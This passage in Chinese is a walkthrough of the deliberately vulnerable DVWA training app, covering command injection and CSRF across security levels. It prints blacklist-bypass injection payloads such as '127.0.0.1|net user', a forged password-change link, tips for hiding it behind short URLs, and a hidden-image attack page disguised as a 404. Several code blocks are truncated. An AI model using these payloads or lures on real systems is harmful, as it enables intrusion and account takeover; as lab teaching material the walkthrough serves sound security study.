```
可以看到,相比 Low 级别的代码,服务器端对 ip 参数做了一定过滤,即把"&&" 、";"删除,本质上采用的是黑名单机制,因此依旧存在安全问题.
**漏洞利用**
`127.0.0.1 & net user`
因为被过滤的只有"&&"与" ;",所以"&"不会受影响.
这里需要注意的是"&&"与" &"的区别:
`Command 1 && Command 2`
先执行 Command 1,执行成功后执行 Command 2,否则不执行 Command 2
`Command 1 & Command 2`
先执行 Command 1,不管是否成功,都会执行 Command 2
**漏洞利用2**
由于使用的是 str_replace 把"&&" 、";"替换为空字符,因此可以采用以下方式绕过:
`127.0.0.1 &;& ipconfig`
这是因为 `127.0.0.1&;&ipconfig` 中的 `;` 会被替换为空字符,这样一来就变成了 `127.0.0.1&& ipconfig` ,会成功执行.
### High
**服务器端核心代码**
```php
 '',
		';'  => '',
		'| ' => '',
		'-'  => '',
		'$'  => '',
		'('  => '',
		')'  => '',
		'`'  => '',
		'||' => '',
	);
	// Remove any of the charactars in the array (blacklist).
	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
	// Determine OS and execute the ping command.
	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
		// Windows
		$cmd = shell_exec( 'ping  ' . $target );
	}
	else {
		// *nix
		$cmd = shell_exec( 'ping  -c 4 ' . $target );
	}
	// Feedback for the end user
	$html .= "{$cmd}";
}
?>
```
相比 Medium 级别的代码,High 级别的代码进一步完善了黑名单,但由于黑名单机制的局限性,我们依然可以绕过.
**漏洞利用**
黑名单看似过滤了所有的非法字符,但仔细观察到是把`| `(注意这里|后有一个空格)替换为空字符,于是 "|"成了"漏网之鱼".
`127.0.0.1|net user`
Command 1 | Command 2
`|`是管道符,表示将 Command 1 的输出作为 Command 2 的输入,并且只打印 Command 2 执行的结果.
### Impossible
**服务器端核心代码**
```php
{$cmd}";
	}
	else {
		// Ops. Let the user name theres a mistake
		$html .= 'ERROR: You have entered an invalid IP.';
	}
}
// Generate Anti-CSRF token
generateSessionToken();
?>
```
**相关函数介绍**
- **stripslashes(string)**
	stripslashes 函数会删除字符串 string 中的反斜杠,返回已剥离反斜杠的字符串.
- **explode(separator,string,limit)**
	把字符串打散为数组,返回字符串的数组.参数 separator 规定在哪里分割字符串,参数 string 是要分割的字符串,可选参数 limit 规定所返回的数组元素的数目.
- **is_numeric(string)**
	检测 string 是否为数字或数字字符串,如果是返回 TRUE,否则返回 FALSE.
	可以看到,Impossible 级别的代码加入了 Anti-CSRF token,同时对参数 ip 进行了严格的限制,只有诸如"数字.数字.数字.数字"的输入才会被接收执行,因此不存在命令注入漏洞.
## CSRF
CSRF,全称 Cross-site request forgery,翻译过来就是跨站请求伪造,是指利用受害者尚未失效的身份认证信息(cookie、会话等),诱骗其点击恶意链接或者访问包含攻击代码的页面,在受害人不知情的情况下以受害者的身份向(身份认证信息所对应的)服务器发送请求,从而完成非法操作(如转账、改密等).CSRF 与 XSS 最大的区别就在于,CSRF 并没有盗取 cookie 而是直接利用.在 2013 年发布的新版 OWASP Top 10 中,CSRF 排名第 8.
### Low
**服务器端核心代码**
```php
' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '' );
		// Feedback for the user
		$html .= "Password Changed.";
	}
	else {
		// Issue with passwords matching
		$html .= "Passwords did not match.";
	}
	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```
可以看到,服务器收到修改密码的请求后,会检查参数 `password_new` 与 `password_conf` 是否相同,如果相同,就会修改密码,并没有任何的防 CSRF 机制(当然服务器对请求的发送者是做了身份验证的,是检查的 cookie,只是这里的代码没有体现= =).
**漏洞利用**
`http:///dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#`
当受害者点击了这个链接,他的密码就会被改成 password(这种攻击显得有些拙劣,链接一眼就能看出来是改密码的,而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了)
需要注意的是,CSRF 最关键的是利用受害者的 cookie 向服务器发送伪造请求,所以如果受害者之前用 A 浏览器登录的这个系统,而用 B 浏览器点击这个链接,攻击是不会触发的,因为 B 浏览器并不能利用 Chrome 浏览器的 cookie,所以会自动跳转到登录界面.
有人会说,这个链接也太明显了吧,不会有人点的,没错,所以真正攻击场景下,我们需要对链接做一些处理.
**漏洞利用2**
我们可以使用短链接来隐藏 URL(点击短链接,会自动跳转到真实网站),自寻搜索"短网址工具 "
**漏洞利用3**
可以构造攻击页面,现实攻击场景下,这种方法需要事先在公网上传一个攻击页面,诱骗受害者去访问,真正能够在受害者不知情的情况下完成 CSRF 攻击.这里为了方便演示,就在本地写一个 test.html,下面是具体代码.
```html
/dvwa/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change#" border="0" style="display:none;"/>
404
file not found.
```
### Medium
**服务器端核心代码**
```php
' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '' );
			// Feedback for the user
			$html .= "Password Changed.";
		}
		else {
			// Issue with passwords matching
			$html .= "Passwords did not match.";
		}
	}
	else {
		// Didn't come from a trusted source
		$html .= "That request didn't look correct.";
	}
	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```
**相关函数说明**
- **int eregi(string pattern, string string)**
	检查 string 中是否含有 pattern(不区分大小写),如果有返回 True,反之 False.
- **stripos(string,find,start)**
	stripos() 函数查找字符串在另一字符串中第一次出现的位置,不区分大小写.
可以看到,Medium 级别的代码检查了保留变量 HTTP_REFERER(http 包头的 Referer 参数的值,表示来源地址)中是否包含 SERVER_NAME(http 包头的 Host 参数,及要访问的主机名,这里是 dvwa靶机的IP地址),希望通过这种机制抵御 CSRF 攻击.
PHP 超全局变量 `$_SERVER` 中的两个值:
$_SERVER['HTTP_REFERER']:PHP 中获取链接到当前页面的前一页面的 url 链接地址,即 HTTP 数据包中的 Referer 参数的值.
$_SERVER['SERVER_NAME']:PHP 中获取服务器主机的名称,即 HTTP 数据包中的 Host 参数的值.
**漏洞利用**
过滤规则是 http 包头的 Referer 参数的值中必须包含主机名(这里是 dvwa 靶机的 IP 地址)
我们可以将攻击页面命名为 .html 就可以绕过了
### High
**服务器端核心代码**
```php
<?php
if( isset( $_GET[ 'Change' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
	// Get input
	$pass_new  = $_GET[ 'password_new' ];
	$pass_conf = $_GET[ 'password_conf' ];
	// Do the passwords match?
	if( $pass_new == $pass_conf ) {
		// They do!
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));